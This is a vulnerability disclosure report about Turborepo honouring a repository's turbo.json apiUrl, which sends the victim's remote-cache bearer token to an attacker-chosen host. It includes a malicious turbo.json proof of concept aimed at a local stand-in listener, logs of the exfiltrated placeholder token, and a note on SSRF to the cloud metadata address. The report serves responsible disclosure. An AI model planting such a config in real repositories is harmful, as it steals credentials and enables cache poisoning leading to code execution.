# Turborepo: repo-controlled `turbo.json` exfiltrates the user's remote-cache token to an attacker host

**Asset:** Turborepo (Tier 1)
**Affected version(s):** Confirmed on **turbo 2.10.11** (latest stable at time of testing). Present
structurally on `main` (2.10.12-canary.0) and, from the code, all versions where the api-url origin
trust check is applied only in the `login` flow.
**Severity:** High (CVSS 4.0 — token disclosure to an attacker-controlled host with a
follow-on remote-cache poisoning → build-time RCE chain).

## Summary
Turborepo honors `remoteCache.apiUrl` and `remoteCache.teamId` from a repository's `turbo.json`
on the `turbo run` / build path. A repository author fully controls these fields. When a victim
who holds a remote-cache token (from `turbo login`, or the legacy `vercel login` credential, or
`TURBO_TOKEN` in CI) clones such a repository and runs `turbo build`, Turborepo attaches the
victim's `Authorization: Bearer <token>` to requests it sends to the **attacker-chosen `apiUrl`**.

The origin-trust check that would prevent pointing the cache at an untrusted host
(`is_trusted_vercel_origin` / `is_user_controlled_url_source`) is invoked **only from the
`turbo login` / SSO flow**, not from the run/cache flow. Building an untrusted repository is a
routine action for open-source contributors and CI, so the token is exposed under default
configuration.

## Impact
An attacker who gets a victim to build a repository they control steals the victim's Vercel/Turbo
remote-cache token. That token grants remote-cache **read and write**, which enables the attacker
to poison the victim's real remote cache with malicious artifacts — leading to **arbitrary code
execution** on the victim's and CI's subsequent builds when those artifacts are restored. For
Vercel account tokens (`vca_…`), the token additionally grants broader Vercel API access.

## Preconditions (all normal defaults for Vercel + Turbo users)
1. The victim has a remote-cache token available to `turbo`: they ran `turbo login`, or only
   `vercel login` (turbo falls back to the Vercel CLI credential), or `TURBO_TOKEN` is set (CI).
2. The victim has not set `apiUrl` at a higher-priority source (`TURBO_API` env / CLI flag). Not
   setting it is the default; `turbo.json`'s `apiUrl` then wins the config merge. `DEFAULT_API_URL`
   is only a getter fallback, not a config layer, so it does not out-prioritize `turbo.json`.
3. `teamId` supplied by `turbo.json` marks the run "linked", which enables remote cache (default
   actions are read + write).

## Root cause (source pointers; paths from the `vercel/turborepo` repo)
- `crates/turborepo-config/src/turbo_json.rs` — `turbo.json`'s `remoteCache` populates `api_url`,
  `team_id`, `team_slug`. Only the **token** is stripped from `turbo.json` (`opts.token = None`);
  `apiUrl`/`teamId`/`teamSlug` are accepted.
- `crates/turborepo-config/src/lib.rs` (config merge) — `turbo.json` is the lowest-priority source
  but wins whenever no higher-priority source set `apiUrl`.
- `crates/turborepo-lib/src/run/builder.rs` and `crates/turborepo-lib/src/commands/mod.rs`
  (`api_auth` / `api_client`) — construct the API client against the merged `apiUrl` and attach the
  victim's token, with **no `api_url_source` trust check** (unlike the login command).
- `crates/turborepo-auth/src/auth/mod.rs` — `is_trusted_vercel_origin` /
  `is_user_controlled_url_source` are only called from `commands/login` and `sso`.

## Steps to reproduce (see attached `poc.zip`)
1. `npm install` (installs stable `turbo`).
2. In one terminal: `node listener.js` — an attacker stand-in on `127.0.0.1:9099` that logs inbound
   `Authorization` headers.
3. In another: `TURBO_TOKEN=VICTIM_SECRET_TOKEN_abc123 npx turbo build`
   (`TURBO_TOKEN` here only simulates the victim's stored login credential so no real Vercel
   account is needed; in the wild the token is read from the victim's stored login.)

The malicious `turbo.json` shipped in the PoC:
```json
{
  "remoteCache": { "enabled": true, "apiUrl": "http://127.0.0.1:9099", "teamId": "team_attacker_controlled" },
  "tasks": { "build": { "outputs": ["dist/**"] } }
}
```

## Observed result (evidence in `poc.zip/evidence.txt`)
Four requests reached the attacker host, each carrying the victim's token:
```
GET  /v8/artifacts/status?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
GET  /v8/artifacts/<hash>?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
POST /v8/artifacts/events?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
PUT  /v8/artifacts/<hash>?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
```

## Suggested fix
Before attaching the token / initializing the remote-cache client on the run path, apply the same
gate already used for login: refuse to send credentials to an `apiUrl` whose configuration source
is `turbo.json` and whose host is not a trusted Vercel origin, unless the user has explicitly
opted in to that custom cache host via a higher-trust source (env/flag/global config). This mirrors
`is_trusted_vercel_origin` / `is_user_controlled_url_source` already present in the auth crate.

## Notes / due diligence
- Reproduced on a stable release (2.10.11), not only canary.
- Searched public sources and the `vercel/turborepo` GitHub Security Advisories (as of 2026-08-23):
  no existing advisory/issue tracks this `apiUrl`-redirect token-exfiltration vector. The related
  CVE-2025-36852 ("CREEP") is a different class (untrusted fork builds sharing a write credential),
  not config-controlled token redirection.
- Related same-root-cause vector (optional, same fix): the config-controlled `apiUrl` also yields
  SSRF (requests with the token to internal hosts, e.g. `169.254.169.254`) since the host is never
  validated on the run path.
